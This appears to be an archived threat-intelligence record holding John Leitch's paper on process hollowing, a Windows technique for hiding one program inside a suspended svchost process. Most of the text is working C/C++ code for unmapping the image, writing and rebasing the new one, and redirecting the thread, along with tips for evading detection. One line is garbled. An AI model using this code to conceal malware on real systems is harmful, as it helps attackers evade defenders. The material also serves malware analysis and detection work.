{
    "id": "010a1cb1-cef4-42ce-95a7-d282ea7e7502",
    "created_at": "2022-10-25T16:48:24.167908Z",
    "updated_at": "2025-03-27T02:05:29.193616Z",
    "deleted_at": null,
    "sha1_hash": "d301c02e986d2825205136634a2f79f26bbf04eb",
    "title": "",
    "authors": "",
    "file_creation_date": "2011-09-26T23:33:51Z",
    "file_modification_date": "2011-09-26T23:33:51Z",
    "file_size": 254414,
    "plain_text": "# Process Hollowing\n\nJohn Leitch\n\njohn@autosectools.com\n\n[http://www.autosectools.com/](http://www.autosectools.com/)\n\n\n-----\n\n## Introduction\nProcess hollowing is yet another tool in the kit of those who seek to hide the presence of a\nprocess. The idea is rather straight forward: a bootstrap application creates a seemingly\ninnocent process in a suspended state. The legitimate image is then unmapped and replaced\nwith the image that is to be hidden. If the preferred image base of the new image does not\nmatch that of the old image, the new image must be rebased. Once the new image is loaded in\nmemory the EAX register of the suspended thread is set to the entry point. The process is then\nresumed and the entry point of the new image is executed.\n\n## Building The Source Executable\nTo successfully perform process hollowing the source image must meet a few requirements:\n\n1. To maximize compatibility, the subsystem of the source image should be set to windows.\n2. The compiler should use the static version of the run-time library to remove dependence\n\nto the Visual C++ runtime DLL. This can be achieved by using the /MT or /MTd compiler\noptions.\n\n\n-----\n\n3. Either the preferred base address (assuming it has one) of the source image must match\n\nthat of the destination image, or the source must contain a relocation table and the\nimage needs to be rebased to the address of the destination. For compatibility reasons\nthe rebasing route is preferred. The /DYNAMICBASE or /FIXED:NO linker options can\nbe used to generate a relocation table.\n\nOnce a suitable source executable has been created it can be loaded in the context of another\nprocess, hiding its presence from cursory inspections.\n\n## Creating The Process\nThe target process must be created in the suspended state. This can be achieved by passing\nthe CREATE_SUSPENDED flag to the CreateProcess function via the dwCreationFlags\nparameter.\n```\nprintf(\"Creating process\\r\\n\");\nLPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();\nLPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();\nCreateProcessA\n(\n    0,\n    pDestCmdLine,\n    0, \n    0, \n    0, \n    CREATE_SUSPENDED, \n    0, \n    0, \n    pStartupInfo, \n    pProcessInfo\n);\nif (!pProcessInfo->hProcess)\n{\n    printf(\"Error creating process\\r\\n\");\n    return;\n}\n\n```\nOnce the process is created its memory space can be modified using the handle provided by\nthe hProcess member of the PROCESS_INFORMATION structure.\n\n## Gathering Information\nFirst, the base address of the destination image must be located. This can be done by querying\nthe process with NtQueryProcessInformation to acquire the address of the process environment\nblock (PEB). The PEB is then read using ReadProcessMemory. All of this functionality is\nencapsulated within a convenient helper function named ReadRemotePEB.\n\n\n-----\n\n```\nPPEB pPEB = ReadRemotePEB(pProcessInfo->hProcess);\n\n```\nOnce the PEB is read from the process, the image base is used to read the NT headers. Once\nagain ReadProcessMemory is utilized, and the functionality is wrapped in a convenient helper\nfunction.\n```\nPLOADED_IMAGE pImage = ReadRemoteImage\n(\n    pProcessInfo->hProcess,\n    pPEB->ImageBaseAddress\n);\n\n## Carving The Hole\n```\nWith headers in hand there is no longer a need for the destination image to be mapped into\nmemory. The NtUnmapViewOfSection function can be utilized to get rid of it.\n```\nprintf(\"Unmapping destination section\\r\\n\");\nHMODULE hNTDLL = GetModuleHandleA(\"ntdll\");\nFARPROC fpNtUnmapViewOfSection = GetProcAddress\n(\n    hNTDLL,\n    \"NtUnmapViewOfSection\"\n);\n_NtUnmapViewOfSection NtUnmapViewOfSection =\n    (_NtUnmapViewOfSection)fpNtUnmapViewOfSection;\nDWORD dwResult = NtUnmapViewOfSection\n(\n    pProcessInfo->hProcess, \n    pPEB->ImageBaseAddress\n);\nif (dwResult)\n{\n    printf(\"Error unmapping section\\r\\n\");\n    return;\n}\n\n```\nNext, a new block of memory is allocated for the source image. The size of the block is\ndetermined by the SizeOfImage member of the source images optional header. For the sake of\nsimplicity the entire block is flagged as PAGE_EXECUTE_READWRITE, but this could be\nimproved upon by allocating each portable executable section with the appropriate flags based\non the characteristics specified in the section header.\n```\nprintf(\"Allocating memory\\r\\n\");\nPVOID pRemoteImage = VirtualAllocEx\n(\n    pProcessInfo->hProcess,\n    pPEB->ImageBaseAddress,\n\n```\n\n-----\n\n```\n    pSourceHeaders->OptionalHeader.SizeOfImage,\n    MEM_COMMIT | MEM_RESERVE,\n    PAGE_EXECUTE_READWRITE\n);\nif (!pRemoteImage)\n{\n    printf(\"VirtualAllocEx call failed\\r\\n\");\n    return;\n}\n\n## Copying The Source Image\n```\nNow that memory has been allocated for the new image it must be copied to the process\nmemory. For the hollowing to work, the image base stored within the optional header of the\nsource image must be set to the destination image base address. However, before setting it the\ndifference between the two base addresses must be calculated for use in rebasing. Once the\noptional header is fixed up, the image is copied to the process via WriteProcessMemory starting\nwith its portable executable headers. Following that, the data of each section is copied.\n```\nDWORD dwDelta = (DWORD)pPEB->ImageBaseAddress     pSourceHeaders->OptionalHeader.ImageBase;\nprintf\n(\n    \"Source image base: 0x%p\\r\\n\"\n    \"Destination image base: 0x%p\\r\\n\",\n    pSourceHeaders->OptionalHeader.ImageBase,\n    pPEB->ImageBaseAddress\n);\nprintf(\"Relocation delta: 0x%p\\r\\n\", dwDelta);\npSourceHeaders->OptionalHeader.ImageBase = (DWORD)pPEB->ImageBaseAddress;\nprintf(\"Writing headers\\r\\n\");\nif (!WriteProcessMemory\n(\n    pProcessInfo->hProcess, \n    pPEB->ImageBaseAddress, \n    pBuffer, \n    pSourceHeaders->OptionalHeader.SizeOfHeaders, \n    0\n))\n{\n    printf(\"Error writing process memory\\r\\n\");\n    return;\n}\nfor (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)\n{\n    if (!pSourceImage->Sections[x].PointerToRawData)\n       continue;\n\n```\n\n-----\n\n```\n    PVOID pSectionDestination = \n       (PVOID)((DWORD)pPEB->ImageBaseAddress +\n           pSourceImage->Sections[x].VirtualAddress);\n    printf\n    (\n       \"Writing %s section to 0x%p\\r\\n\",\n       pSourceImage->Sections[x].Name, pSectionDestination\n    );\n    if (!WriteProcessMemory\n    (\n       pProcessInfo->hProcess, \n       pSectionDestination,\n       &pBuffer[pSourceImage->Sections[x].PointerToRawData],\n       pSourceImage->Sections[x].SizeOfRawData,\n       0\n    ))\n    {\n       printf (\"Error writing process memory\\r\\n\");\n       return;\n    }\n}\n\n```\nAs was mentioned earlier taking this step a bit further by applying the proper memory protection\noptions to the different sections would make the hollowing harder to detect.\n\n## Rebasing The Source Image\nIf the delta calculated in the prior step is not zero the source image must be rebased. To do this,\nthe bootstrap application makes use of the relocation table stored in the .reloc section. The\nrelevant IMAGE_DATA_DIRECTORY, accessed with the\nIMAGE_DIRECTORY_ENTRY_BASERELOC constant, contains a pointer to the table.\n```\nIMAGE_DATA_DIRECTORY relocData = pSourceHeaders->\n    OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];\n\n```\nThe relocation table itself is broken down into a series of variable length blocks, each containing\na series of entries for a 4KB page. At the head of each relocation block is the page address\nalong with the block size, followed by the relocation entries. Each relocation entry is a single\nword; the low 12 bits are the relocation offset, and the high 4 bits are the relocation types. C bit\nfields can be used to easily access these values.\n```\ntypedef struct BASE_RELOCATION_BLOCK {\n    DWORD PageAddress;\n    DWORD BlockSize;\n} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;\ntypedef struct BASE_RELOCATION_ENTRY {\n    USHORT Offset : 12;\n    USHORT Type : 4;\n} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY; \n\n```\n\n-----\n\nTo calculate the number of entries in a block, the size of BASE_RELOCATION_BLOCK is\nsubtracted from BlockSize and the difference is divided by the size of\nBASE_RELOCATION_ENTRY. The macro below assists in these calculations.\n```\n#define CountRelocationEntries(dwBlockSize) \\\n    (dwBlockSize - \\\n    sizeof(BASE_RELOCATION_BLOCK)) / \\\n    sizeof(BASE_RELOCATION_ENTRY) \n\n```\nPutting this together we can iterate through each block and its respective entries, patching the\naddresses of the image along the way.\n```\nDWORD dwRelocAddr = pSourceImage->Sections[x].PointerToRawData;\nDWORD dwOffset = 0;\nIMAGE_DATA_DIRECTORY relocData = pSourceHeaders->\n    OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];\nwhile (dwOffset < relocData.Size)\n{\n    PBASE_RELOCATION_BLOCK pBlockheader = \n       (PBASE_RELOCATION_BLOCK)&pBuffer[dwRelocAddr + dwOffset];\n    dwOffset += sizeof(BASE_RELOCATION_BLOCK);\n    DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);\n    PBASE_RELOCATION_ENTRY pBlocks = \n       (PBASE_RELOCATION_ENTRY)&pBuffer[dwRelocAddr + dwOffset];\n    for (DWORD y = 0; y < dwEntryCount; y++)\n    {\n       dwOffset += sizeof(BASE_RELOCATION_ENTRY);\n       if (pBlocks[y].Type == 0)\n           continue;\n       DWORD dwFieldAddress = \n           pBlockheader->PageAddress + pBlocks[y].Offset;\n       DWORD dwBuffer = 0;\n       ReadProcessMemory\n       (\n           pProcessInfo->hProcess, \n           (PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress),\n           &dwBuffer,\n           sizeof(DWORD),\n           0\n       );\n       dwBuffer += dwDelta;\n       BOOL bSuccess = WriteProcessMemory\n       (\n           pProcessInfo->hProcess,\n\n```\n\n-----\n\n```\n           (PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress),\n           &dwBuffer,\n           sizeof(DWORD),\n           0\n       );\n       if (!bSuccess)\n       {\n           printf(\"Error writing memory\\r\\n\");\n           continue;\n       }\n    }\n}\n\n## The Final Touches\n```\nWith the source image loaded into the target process some changes need to be made to the\nprocess thread. First, the thread context must be acquired. Because only the EAX register\nneeds to be updated the ContextFlags member of the CONTEXT structure can be set to\nCONTEXT_INTEGER.\n```\nLPCONTEXT pContext = new CONTEXT();\npContext->ContextFlags = CONTEXT_INTEGER;\nprintf(\"Getting thread context\\r\\n\");\nif (!GetThreadContext(pProcessInfo->hThread, pContext))\n{\n    printf(\"Error getting context\\r\\n\");\n    return;\n}\n\n```\nAfter the thread context has been acquired the EAX member is set to the sum of the base\naddress and the entry point address of the source image.\n```\nDWORD dwEntrypoint = (DWORD)pPEB->ImageBaseAddress +\n    pSourceHeaders->OptionalHeader.AddressOfEntryPoint;\npContext->Eax = dwEntrypoint; \n\n```\nThe thread context is then set, applying the changes to the EAX register\n```\nprintf(\"Setting thread context\\r\\n\");\nif (!SetThreadContext(pProcessInfo->hThread, pContext))\n{\n    printf(\"Error setting context\\r\\n\");\n    return;\n}\n\n```\nFinally, the thread is resumed, executing the entry point of the source image.\n```\nprintf(\"Resuming thread\\r\\n\");\n\n```\n\n-----\n\n```\nif (!ResumeThread(pProcessInfo->hThread))\n{\n    printf(\"Error resuming thread\\r\\n\");\n    return;\n}\n\n```\nThe hollowing function is now ready to use. To test it, svchost.exe (the Windows service host) is\nhollowed out and replaced with a simple application that displays a message box.\n```\nint _tmain(int argc, _TCHAR* argv[])\n{\n    char* pPath = new char[MAX_PATH];\n    GetModuleFileNameA(0, pPath, MAX_PATH);\n    pPath[strrchr(pPath, '\\\\') - pPath + 1] = 0;\n    strcat(pPath, \"helloworld.exe\");\n    CreateHollowedProcess\n    (\n       \"svchost\", \n       pPath\n    );\n    system(\"pause\");\n    return 0;\n}\n\n```\nOnce the application is run, its output confirms that the hollowing was successful.\n\nCreating process\nOpening source image\nUnmapping destination section\nAllocating memory\nSource image base: 0x00400000\nDestination image base: 0x00A60000\nRelocation delta: 0x00660000\nWriting headers\nWriting .text section to 0x00A8B000\nWriting .rdata section to 0x00AE2000\nWriting .data section to 0x00AF3000\nWriting .idata section to 0x00AF7000\nWriting .rsrc section to 0x00AF8000\nWriting .reloc section to 0x00AF9000\nRebasing image\nGetting thread context\nSetting thread context\nResuming thread\nProcess hollowing complete\nPress any key to continue . . .\n\n\n-----\n\n## Resources\nProcess Hollowing Source\n[http://code.google.com/p/process-hollowing/downloads/list](http://code.google.com/p/process-hollowing/downloads/list)\n\nMalware Analyst's Cookbook and DVD: Tools and Techniques for Fighting Malicious Code\n[http://www.amazon.com/Malware-Analysts-Cookbook-DVD-Techniques/dp/0470613033](http://www.amazon.com/Malware-Analysts-Cookbook-DVD-Techniques/dp/0470613033)\n\nMicrosoft Portable Executable and Common Object File Format Specification\n[http://download.microsoft.com/download/9/c/5/9c5b2167-8017-4bae-9fde-](http://download.microsoft.com/download/9/c/5/9c5b2167-8017-4bae-9fde-d599bac8184a/pecoff_v8.docx)\n[d599bac8184a/pecoff_v8.docx](http://download.microsoft.com/download/9/c/5/9c5b2167-8017-4bae-9fde-d599bac8184a/pecoff_v8.docx)\n\nPeering Inside the PE: A Tour of the Win32 Portable Executable File Format\n[http://msdn.microsoft.com/en-us/library/ms809762.aspx](http://msdn.microsoft.com/en-us/library/ms809762.aspx)\n\nPEB (Process Enviroment Block)\n[http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/NT%20Objects/Pr](http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/NT%20Objects/Process/PEB.html)\n[ocess/PEB.html](http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/NT%20Objects/Process/PEB.html)\n\n/MD, /MT, /LD (Use Run-Time Library)\n[http://msdn.microsoft.com/en-us/library/2kzt1wy3.aspx](http://msdn.microsoft.com/en-us/library/2kzt1wy3.aspx)\n\n/FIXED (Fixed Base Address)\n[http://msdn.microsoft.com/en-us/library/w368ysh2(v=vs.80).aspx](http://msdn.microsoft.com/en-us/library/w368ysh2(v=vs.80).aspx)\n\n/DYNAMICBASE (Use address space layout randomization)\n[http://msdn.microsoft.com/en-us/library/bb384887.aspx](http://msdn.microsoft.com/en-us/library/bb384887.aspx)\n\nC Bit Fields\n[http://msdn.microsoft.com/en-us/library/yszfawxh(v=vs.80).aspx](http://msdn.microsoft.com/en-us/library/yszfawxh(v=vs.80).aspx)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        }
    ],
    "references": [
        "http://www.autosectools.com/process-hollowing.pdf"
    ],
    "report_names": [
        "process-hollowing.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1666716504,
    "ts_updated_at": 1743041129,
    "ts_creation_date": 1317080031,
    "ts_modification_date": 1317080031,
    "files": {
        "pdf": "https://archive.orkl.eu/d301c02e986d2825205136634a2f79f26bbf04eb.pdf",
        "text": "https://archive.orkl.eu/d301c02e986d2825205136634a2f79f26bbf04eb.txt",
        "img": "https://archive.orkl.eu/d301c02e986d2825205136634a2f79f26bbf04eb.jpg"
    }
}